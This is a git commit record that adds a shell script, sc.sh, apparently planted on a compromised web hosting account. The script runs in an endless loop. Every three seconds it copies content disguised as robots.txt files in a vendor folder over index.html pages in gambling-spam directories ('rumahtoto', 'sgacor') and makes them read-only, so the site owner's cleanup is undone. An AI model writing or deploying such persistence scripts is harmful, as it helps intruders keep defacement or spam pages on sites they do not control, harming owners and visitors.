cf156c05df99192ae11b31450b8c73246335ea6a
HaOMing_X12 <hcacaa75@gmail.com>
2024-09-08 19:45:23 +0700

    sc.sh

---
+++ sc.sh
@@ -0,0 +1,18 @@
+#!/bin/sh
+#HaOMin_X12
+while true
+do
+    # Copy file
+    cp /home/stiatab2/public_html/vendor/ifsnop/robots.txt /home/stiatab2/public_html/rumahtoto/index.html
+
+    chmod 444 /home/stiatab2/public_html/rumahtoto/index.html
+    
+    # Create directory
+    mkdir /home/stiatab2/public_html/sgacor
+
+    cp /home/stiatab2/public_html/vendor/robot.txt /home/stiatab2/public_html/sgacor/index.html
+
+    chmod 444 /home/stiatab2/public_html/sgacor/index.html
+
+    sleep 3
+done
